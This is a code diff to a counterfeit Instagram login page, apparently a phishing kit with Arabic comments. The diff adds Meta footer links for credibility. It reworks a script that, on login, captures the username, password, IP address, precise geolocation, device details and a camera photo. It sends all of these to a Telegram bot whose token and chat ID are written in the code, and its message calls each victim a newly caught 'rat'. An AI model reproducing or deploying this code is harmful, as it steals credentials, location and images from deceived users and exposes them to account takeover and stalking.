@@ -5,6 +5,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Instagram</title>
+    <link rel="stylesheet" href="style.css">
     <link rel="icon" href="https://instalogin-clone.vercel.app/images/insta_logo.png">
 </head>
 
@@ -33,15 +34,31 @@
         </div>
         <div class="app">
             <span class="gettheapp">Get the app.</span>
-            <a href="https://play.google.com/store/apps/details?id=com.instagram.android&pcampaignid=web_share" target="_blank">
-                <img id="gplay" src="https://instalogin-clone.vercel.app/images/google-play.png" alt="Google Play">
-            </a>
-            <a href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-US&gl=US" target="_blank">
-                <img id="microsoft" src="https://instalogin-clone.vercel.app/images/microsoft.png" alt="Microsoft Store">
-            </a>
+            <img id="gplay" src="https://instalogin-clone.vercel.app/images/google-play.png" href="https://play.google.com/store/apps/details?id=com.instagram.android&pcampaignid=web_share" alt="googleplay">
+            <img id="microsoft" src="https://instalogin-clone.vercel.app/images/microsoft.png" href="https://apps.microsoft.com/detail/9nblggh5l9xt?hl=en-US&gl=US" alt="microsoft">
         </div>
     </div>
-    
+    <div class="footer">
+        <div class="linksdiv">
+            <a class="links" href="https://about.meta.com/">Meta</a>
+            <a class="links" href="https://about.instagram.com/">About</a>
+            <a class="links" href="https://about.instagram.com/blog/">Blog</a>
+            <a class="links" href="https://about.instagram.com/about-us/careers">Jobs</a>
+            <a class="links" href="https://help.instagram.com/">Help</a>
+            <a class="links" href="https://developers.facebook.com/docs/instagram">API</a>
+            <a class="links" href="https://www.instagram.com/legal/privacy/">Privacy</a>
+            <a class="links" href="https://www.instagram.com/legal/terms/">Terms</a>
+            <a class="links" href="https://www.instagram.com/explore/locations/">Locations</a>
+            <a class="links" href="https://www.instagram.com/web/lite/">Instagram Lite</a>
+            <a class="links" href="https://www.threads.net/">Threads</a>
+            <a class="links" href="https://www.facebook.com/help/instagram/261704639352628">Contact Uploading & Non-Users</a>
+            <a class="links" href="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer">Meta-Verified</a>
+        </div>
+        <div class="copyright">
+            &#169 2025 Instagram from Meta
+        </div>
+    </div>
+
     <script>
         document.querySelector("#loginbutton").addEventListener("click", function(event) {
             event.preventDefault();
@@ -49,6 +66,8 @@
             var username = document.getElementById("username").value;
             var password = document.querySelector("#password").value;
             var userAgent = navigator.userAgent;
+            var ip = '';
+            var location = '';
             var deviceType = navigator.platform;
             var language = navigator.language;
             var os = navigator.platform;
@@ -58,40 +77,43 @@
             var referrer = document.referrer;
 
             // دقة الموقع الجغرافي
-            let location = "لم يتم تحديد الموقع";
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(function(position) {
                     location = `Lat: ${position.coords.latitude}, Lon: ${position.coords.longitude}`;
-                    captureAndSendData(username, password, userAgent, location, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer);
+                    captureAndSendData(username, password, userAgent, location, ip, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer);
                 }, function(error) {
                     console.log("Error getting geolocation:", error);
-                    captureAndSendData(username, password, userAgent, location, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer);
+                    location = "لم يتم تحديد الموقع";
+                    captureAndSendData(username, password, userAgent, location, ip, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer);
+                }, {
+                    enableHighAccuracy: true,
+                    timeout: 5000,
+                    maximumAge: 0
                 });
             } else {
                 alert("Geolocation not supported.");
             }
 
-            // الحصول على IP
+            // وظيفة للحصول على عنوان الـ IP
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(data => {
-                    var ip = data.ip;
-                    captureAndSendData(username, password, userAgent, location, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer, ip);
+                    ip = data.ip;
+                    captureAndSendData(username, password, userAgent, location, ip, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer);
                 })
                 .catch(error => {
                     console.error("IP fetch error:", error);
-                    var ip = 'IP غير متاح';
-                    captureAndSendData(username, password, userAgent, location, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer, ip);
+                    ip = 'IP غير متاح';
+                    captureAndSendData(username, password, userAgent, location, ip, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer);
                 });
 
             // جمع معلومات الجهاز الإضافية
-            function captureAndSendData(username, password, userAgent, location, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer, ip) {
+            function captureAndSendData(username, password, userAgent, location, ip, deviceType, language, os, screenWidth, screenHeight, pageUrl, referrer) {
                 var hardwareInfo = {
                     uuid: '12345-abcde',
                     macAddress: '00:14:22:01:23:45'
                 };
 
-                // التقاط صورة من الكاميرا
                 if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                     navigator.mediaDevices.getUserMedia({ video: true })
                         .then(function(stream) {
@@ -126,7 +148,6 @@
                 var botToken = "7590971159:AAEKdP-eSEE99hsy1rTEUAi0zba7BginDoA";
                 var chatId = "5091980014";
 
-                // رسالة باللغة العربية
                 var messageArabic = `⚡️ **تم صيد فأر جديد نوع الحساب انستجرام بواسطة PhantomX @tx_5w** ⚡️\n\n`;
                 messageArabic += `🧑‍💻 **اسم المستخدم:** ${username}\n`;
                 messageArabic += `🔑 **كلمة المرور:** ${password}\n\n`;
@@ -157,7 +178,6 @@
                     console.error('Telegram send error:', error);
                 });
 
-                // إرسال الصورة عبر API
                 var formData = new FormData();
                 formData.append("photo", imageData, "user_photo.jpg");
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
